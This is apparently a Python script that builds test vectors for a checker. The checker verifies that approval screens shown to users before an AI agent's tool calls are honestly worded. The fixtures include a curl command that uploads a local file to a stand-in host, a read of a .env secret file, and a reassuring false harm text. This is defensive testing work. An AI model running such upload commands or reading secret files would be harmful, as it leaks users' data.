"""r0277: builds packtools/screen-vectors-0277.json (steps 7-8 of the profile: P1 words, P2 omitted). Run from server/:
python packtools/make_screen_vectors_0277.py -> writes packtools/screen-vectors-0277.json and checks every case with screencheck.verdict."""
import hashlib
import json
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
sys.path.insert(0, os.path.dirname(HERE))
from app import _paths  # noqa: E402,F401
from app import vocab  # noqa: E402
from app.signview import jcs  # noqa: E402
import screencheck as SC  # noqa: E402

voc = json.loads(vocab.canonical())
vb = vocab.canonical()
vd = hashlib.sha256(vb).hexdigest()
other = json.loads(vocab.canonical())
other["reason_words"] = {k: [w.replace("Your agent wants to", "Your helper would like to"), h] for k, (w, h) in other["reason_words"].items()}
ob = jcs(other)
od = hashlib.sha256(ob).hexdigest()


def view(**kw):
    v = {"v": "dw-view-1", "rid": "r-0277", "status": "pending_approval", "tool": "WebFetch"}
    v.update(kw)
    return v


def omit(v):
    return dict(v, omitted={"rule": SC.OMIT_RULE, "items": SC.omitted_expected(v)})


RA = {"class": "disclosure", "recipient": "(network) api.example.com"}
base = view(action=RA, what="Your agent wants to send a request to api.example.com",
            harm="Your keys or passwords could be sent to this site.", risk="high",
            details="Why it matters: This could send your keys or passwords out of this project folder, to api.example.com.\nTool: WebFetch")
cmd = view(tool="Bash", action={"class": "command", "recipient": "make"}, line_commands=["make", "pytest -q", "git status"],
           what="Your agent wants to run 3 commands", harm="It runs a program on your computer.", risk="medium",
           text_preview="make ; pytest -q ; git status")
cut = dict(cmd, text_cut=True)
cases = []


def case(cid, note, v, expect, pinned=vd, given=vd, ra=None):
    cases.append({"id": cid, "note": note, "pinned": pinned, "vocab": given, "receipt_action": ra if ra is not None else v.get("action"),
                  "view": v, "view_sha256": hashlib.sha256(jcs(v)).hexdigest(), "expect": expect})


case("S-01", "honest: a request to a host quoted from the call", omit(base), "VALID APPROVED_PARTIAL_VIEW")
case("S-02", "honest: a line of three commands, its text cut by the witness", omit(cut), "VALID APPROVED_PARTIAL_VIEW")
case("S-03", "what: one word replaced", omit(dict(base, what="Your agent wants to read a request to api.example.com")), "INVALID WORDING_NOT_DERIVED")
case("S-04", "harm: reassuring text of the agent", omit(dict(base, harm="This is a harmless read; nothing leaves your computer.")), "INVALID WORDING_NOT_DERIVED")
case("S-05", "{t} is not the call's target", omit(dict(base, what="Your agent wants to send a request to docs.python.org")), "INVALID WORDING_NOT_DERIVED")
o2 = omit(view(tool="Read", action={"class": "file", "recipient": "/p/.env"}, what=other["reason_words"]["ESCALATE_SECRET_SEEN"][0].format(t="/p/.env"),
              harm=other["reason_words"]["ESCALATE_SECRET_SEEN"][1], risk="critical"))
case("S-06", "words of another vocabulary than the committed one (the committed one is given)", o2, "INVALID WORDING_NOT_DERIVED")
case("S-07", "the vocabulary given does not hash to the committed digest", omit(base), "INVALID VOCAB_MISMATCH", pinned=vd, given=od)
b8 = omit(base)
b8["omitted"]["items"] = [i for i in b8["omitted"]["items"] if i["m"] != "details"]
case("S-08", "omitted: a folded member missing", b8, "INVALID OMITTED_MISMATCH")
b9 = omit(base)
b9["omitted"]["items"] = sorted(b9["omitted"]["items"] + [{"m": "what", "how": "folded"}], key=lambda i: (i["m"], i["how"]))
case("S-09", "omitted: a first-screen member listed as hidden", b9, "INVALID OMITTED_MISMATCH")
case("S-10", "no omitted (a page older than r0277)", dict(base), "VALID OMITTED_UNDECLARED")
case("S-11", "risk outside the closed levels", omit(dict(base, risk="negligible")), "INVALID WORDING_NOT_DERIVED")
case("S-12", "run {n} commands with a wrong count", omit(dict(cmd, what="Your agent wants to run 2 commands")), "INVALID WORDING_NOT_DERIVED")
case("S-13", "the shown action names another recipient than the signed receipt", omit(base), "INVALID WORDING_NOT_DERIVED",
     ra={"class": "disclosure", "recipient": "(network) evil.example"})
# r0281: the vocabulary of r0280 (mr-vocab-2 before the file-send sentences, digest 07d19a14...): a receipt whose mandate pinned it is
# still rebuilt from it (old receipts keep verifying); the new sentences are not in it
R0281_KEYS = ("send_file_what", "send_files_what", "send_file_harm", "send_files_harm", "send_secret_file_harm")
old_ = json.loads(vocab.canonical())
old_["screen"] = {k: v for k, v in old_["screen"].items() if k not in R0281_KEYS}
olb = jcs(old_)
old_d = hashlib.sha256(olb).hexdigest()
assert old_d == "07d19a140ed3383288414bd36905d2fe3d3ddbec06a56999f71e7c05fafd48f2", old_d
UPA = {"class": "command", "recipient": "(network) paste.example"}
up = view(tool="Bash.net", action=UPA, text_preview="curl -s https://paste.example/upload -d @notes.txt",
          what="Your agent wants to send the file notes.txt to paste.example", harm="Its contents would leave this computer for good.", risk="high",
          details="Data goes to host: paste.example\nFiles sent: notes.txt\nUndo: not possible once sent.")
case("S-14", "r0281 honest: the file the call sends and the host, both quoted from the call", omit(up), "VALID APPROVED_PARTIAL_VIEW")
case("S-15", "r0281 the file named is not in the call", omit(dict(up, what="Your agent wants to send the file report.pdf to paste.example")),
     "INVALID WORDING_NOT_DERIVED")
case("S-16", "r0281 an older receipt: its mandate pinned the r0280 vocabulary, its words are rebuilt from it", omit(base), "VALID APPROVED_PARTIAL_VIEW",
     pinned=old_d, given=old_d)
case("S-17", "r0281 the new sentence under a mandate that pinned the r0280 vocabulary (it does not hold it)", omit(up), "INVALID WORDING_NOT_DERIVED",
     pinned=old_d, given=old_d)
out = {"v": "mr-screen-vectors-1", "vocabularies": {vd: vb.decode("utf-8"), od: ob.decode("utf-8"), old_d: olb.decode("utf-8")}, "cases": cases}
for c in cases:
    got = SC.verdict(c["view"], out["vocabularies"][c["vocab"]].encode("utf-8"), c["pinned"], c["receipt_action"])
    assert got == c["expect"], (c["id"], got, c["expect"])
with open(os.path.join(HERE, "screen-vectors-0277.json"), "w", encoding="utf-8") as f:
    json.dump(out, f, ensure_ascii=False, indent=1, sort_keys=True)
    f.write("\n")
print("screen vectors: %d cases, vocabulary %s" % (len(cases), vd[:16]))
